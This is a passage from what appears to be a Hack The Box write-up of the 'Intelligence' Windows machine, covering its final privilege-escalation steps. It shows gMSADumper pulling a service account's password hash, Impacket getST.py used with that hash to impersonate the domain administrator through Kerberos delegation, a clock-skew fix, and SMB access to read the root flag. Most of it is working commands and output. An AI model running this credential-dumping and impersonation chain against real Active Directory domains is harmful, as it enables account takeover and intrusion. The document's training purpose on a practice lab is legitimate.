Saving to: ‘gMSADumper.py’
gMSADumper.py      100%[==================================================================>]   4.50K  --.-KB/s    in 0.001s  
2021-10-08 15:12:07 (3.61 MB/s) - ‘gMSADumper.py’ saved [4609/4609]

┌──(root💀kali)-[~/htb/intelligence]
└─# python3 gMSADumper.py -u Ted.Graves -p <HIDDEN> -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d170ae19de30439df55d6430e12dd621
```

## Impacket Service Ticket

With the hash of the service account we can use the [Impacket](https://github.com/SecureAuthCorp/impacket) getST.py script to request a service ticket whilst imperosnating the administrator:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate administrator
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

## Time Skew Fix

My VM's clock has to be within a few minutes of the domain controller, so first we need to sync them. This was quite painful!

Shut VM down and then from host, which for me was Windows 10 you need to disable the time sync. Open PowerShell and type this:

```powershell
PS C:\Program Files\Oracle\VirtualBox> .\VBoxManage.exe setextradata "Kali-Linux-2021.3-vbox-amd64" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
```

Now start the VM back up and install ntupdate and chrony:

```sh
┌──(root💀kali)-[~]
└─# apt install ntpdate chrony
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
chrony is already the newest version (4.1-3).
ntpdate is already the newest version (1:4.2.8p15+dfsg-1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

Now set Kali to use NTP for it's time server and update from the box:

```sh
┌──(root💀kali)-[~]
└─# timedatectl set-ntp true

┌──(root💀kali)-[~]
└─# ntpdate 10.10.10.248
 8 Oct 22:52:49 ntpdate[1268]: step time server 10.10.10.248 offset +26079.737476 sec
```

We see our clock has been changed. Now we try getST again:

```sh
┌──(root💀kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d170ae19de30439df55d6430e12dd621 -impersonate administrator
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache

┌──(root💀kali)-[~]
└─# export KRB5CCNAME=Administrator.ccache
```

## Root Flag

This time it works. We can finally use the Impacket smbclient script to connect as administrator:

```sh
┌──(root💀kali)-[~]
└─# impacket-smbclient Administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] [Errno Connection error (dc.intelligence.htb:445)] [Errno -2] Name or service not known
```

Another problem! This time a simple one, I'd forgotten to add the DC to my hosts file:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# echo "10.10.10.248 dc.intelligence.htb" >> /etc/hosts
```

Try again for one last time:

```sh
┌──(root💀kali)-[~]
└─# impacket-smbclient Administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
Users
# cd Users
# cd Administrator
# cd Desktop
# ls
drw-rw-rw-          0  Mon Apr 19 01:51:57 2021 .
drw-rw-rw-          0  Mon Apr 19 01:51:57 2021 ..
-rw-rw-rw-        282  Mon Apr 19 01:40:10 2021 desktop.ini
-rw-rw-rw-         34  Fri Oct  8 12:56:30 2021 root.txt
# get root.txt
# exit

┌──(root💀kali)-[~]
└─# cat root.txt                                     
<HIDDEN>
```

We've finally rooted the box. That was pretty tough for me, I need to do more Windows boxes!

See you next time.
